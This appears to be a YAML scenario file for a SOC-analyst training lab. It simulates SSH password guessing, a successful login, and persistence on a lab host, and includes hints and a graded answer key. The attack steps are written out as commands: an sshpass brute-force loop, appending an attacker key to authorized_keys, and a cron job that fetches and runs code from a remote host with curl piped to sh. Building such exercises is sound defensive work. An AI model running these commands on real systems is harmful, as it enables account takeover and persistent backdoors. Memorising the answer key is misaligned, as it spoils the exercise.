@@ -1,0 +1,150 @@
+schema_version: "1.0"
+id: SCN-021
+name: "Repeated authentication failures, then success and a new persistence artifact — vic-jump"
+description: >
+  A sustained run of failed SSH authentications for one account on
+  vic-jump, then a successful login from the same source, then session
+  activity that leaves new persistence behind. Multiple alert types
+  across a time window. Triage and disposition.
+author: "Wachturm Contributors"
+created: 2026-05-18
+category: credential_access
+expected_verdict: true_positive
+mitre:
+  - T1110
+  - T1078
+  - T1098.004
+  - T1053.003
+difficulty: hard
+duration_minutes: 5
+tags: [ssh, multi-stage, persistence, credential-abuse, advanced]
+
+setup:
+  - actor: vic-jump
+    # mwong: scenario-owned (NOT analyst/admin/bobsmith/breakglass/jdoe/
+    # awilson — owned by noise-gen/SCN-001/003/011/012/034;
+    # account-exclusion contract, images/noise-gen/README.md).
+    # mwong is scenario-owned (NOT analyst/admin/bobsmith/breakglass/
+    # jdoe/awilson — account-exclusion contract). Its password is the
+    # seeded terminal entry of the PROVEN wachturm-easy.txt wordlist so
+    command: "id mwong >/dev/null 2>&1 || useradd -m -s /bin/bash mwong; echo 'mwong:Sup3rs3cret!' | chpasswd"
+    description: "Ensure the target 'mwong' account exists"
+
+steps:
+  - actor: atk-kali
+    # STAGE 1 — a SEQUENTIAL burst of wrong-password attempts. Each
+    # attempt deterministically logs one "Failed password" -> rule 5760
+    # (no hydra/-t4/-f parallelism or first-success race — that made the
+    # failure count non-deterministic across runs). 10 attempts at ~1s
+    # cadence is a tight, reliable cluster the analyst sees on the
+    # timeline. (We deliberately do NOT assert Wazuh's 40112 correlation
+    # — frequency/timeframe/ignore correlation rules are non-
+    # deterministic across runs; expected_alerts is LAB_INTEGRITY, not
+    # grading, so it asserts the deterministic primitives. The student
+    # builds the failures-then-success picture themselves; 40112 is a
+    # bonus confirmation when the platform happens to fire it.)
+    description: "Stage 1: sequential wrong-password burst (deterministic 5760 cluster)"
+    command: "for i in $(seq 1 10); do sshpass -p \"WrongPw-$i\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 mwong@10.50.10.30 true 2>/dev/null; sleep 1; done; true"
+    delay_seconds: 0
+    timeout_seconds: 120
+
+  - actor: atk-kali
+    # STAGE 2 — the pressure pays off: a clean, distinct success from
+    # the same source, right after the failure cluster. Fires 5715
+    # (authentication success). Together with the 5760 cluster this IS
+    # the failures-then-success compromise picture the analyst must
+    # assemble (mirrors SCN-001's step 3).
+    description: "Stage 2: a successful login from the same source"
+    command: "sshpass -p 'Sup3rs3cret!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 mwong@10.50.10.30 'true'"
+    delay_seconds: 8
+    timeout_seconds: 30
+
+  - actor: atk-kali
+    # STAGE 3 — post-auth persistence: TWO mechanisms (an attacker SSH
+    # key AND a cron job). The advanced lesson is correlating the stages
+    # across the time window and catching BOTH persistence artifacts,
+    # not just the loud failures. Neither needs root (a user owns
+    # ~/.ssh and their own crontab).
+    description: "Stage 3: plant SSH key and a cron job (persistence)"
+    command: "sshpass -p 'Sup3rs3cret!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null mwong@10.50.10.30 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATTACKERKEYwachturmSCN021 attacker@evil\" >> ~/.ssh/authorized_keys; (crontab -l 2>/dev/null; echo \"*/10 * * * * curl -s http://10.50.10.250/beacon | sh\") | crontab - 2>/dev/null; whoami; id; crontab -l 2>/dev/null; true'"
+    delay_seconds: 6
+    timeout_seconds: 30
+
+# Proven Linux auth path: the wrong-password cluster fires rule 5760
+# (deterministic, one per attempt), the distinct success fires 5715.
+# expected_alerts is LAB_INTEGRITY (SCHEMA §5), not student grading, so
+# it asserts ONLY these deterministic primitives — NOT Wazuh's 40112
+# "failures-followed-by-success" correlation (frequency=8/timeframe=120/
+# ignore=60 + a chained success: non-deterministic across runs; great
+# detection coverage, brittle as a CI gate). The always-on watcher
+# turns these level>=3 auth alerts (srcip+host+user) into the IRIS
+# case; the failures-then-success picture and the two persistence
+# artifacts are what the analyst correlates — the platform may or may
+# not auto-flag it (40112), and a Tier-1 who depends on it misses the
+# real-world cases where it doesn't fire. vic-jump has no realtime FIM
+# (persistence is post-auth session evidence), same model as SCN-001/011.
+expected_alerts:
+  - rule_id: 5760
+    description: "sshd: authentication failed (the wrong-password cluster)"
+    minimum_count: 5
+    timeframe_seconds: 220
+  - rule_id: 5715
+    description: "sshd: authentication success (the distinct later success)"
+    minimum_count: 1
+    timeframe_seconds: 260
+
+expected_observables:
+  - type: ip
+    value: "10.50.10.250"
+  - type: hostname
+    value: "vic-jump"
+  - type: user
+    value: "mwong"
+
+hints:
+  - "This is not one event. Lay the alerts on a timeline: what came first, what immediately followed the burst of failures, and what happened in the session after that?"
+  - "A sustained run of failures followed by a success — does Wazuh's compromise-correlation rule fire? What does that specific rule existing tell you that the individual failures don't?"
+  - "After the successful login, what did the session leave behind so the attacker can return WITHOUT the password? Look for more than one mechanism."
+
+answer_key:
+  verdict: true_positive
+  severity: high
+  confidence: high
+  required_observables:
+    - type: ip
+      value: "10.50.10.250"
+      role: source
+    - type: hostname
+      value: "vic-jump"
+      role: target
+    - type: user
+      value: "mwong"
+      role: compromised
+  summary_keywords:
+    - any_of: ["credential pressure", "repeated failures", "brute force", "mfa fatigue", "credential abuse", "account compromise", "failures followed by a success"]
+    - any_of: ["persistence", "authorized_keys", "cron", "backdoor", "multi-stage", "escalate"]
+  next_steps:
+    - contain_host
+    - reset_credentials
+    - remove_persistence
+    - escalate_t2
+  reasoning: >
+    Three correlated stages across a time window, not one alert, and the
+    analyst must assemble the correlation themselves rather than wait for
+    the platform to label it: (1) a tight cluster of failed SSH
+    authentications for 'mwong' from 10.50.10.250 (rule 5760 — credential
+    pressure), (2) a successful authentication from that same source
+    immediately after (rule 5715) — the failures-then-success shape is
+    the compromise signal whether or not Wazuh's 40112 correlation
+    happens to fire (it may; depending on it is the Tier-1 failure mode
+    this scenario teaches against), and (3) post-auth persistence: an
+    attacker SSH key appended to ~/.ssh/authorized_keys AND a malicious
+    cron job. This is an account compromise with established persistence
+    — a true positive. The advanced skill is building the failures→
+    success picture from the 5760 cluster and the 5715, then catching
+    BOTH persistence mechanisms (a credential reset alone evicts
+    neither). Severity high (active compromise + persistence); confidence
+    high (the failure-cluster→success pattern plus two concrete
+    persistence artifacts are unambiguous). Disposition: contain
+    vic-jump, reset mwong's credentials, remove the planted key AND the
+    cron job, escalate to Tier 2 to scope the full dwell.
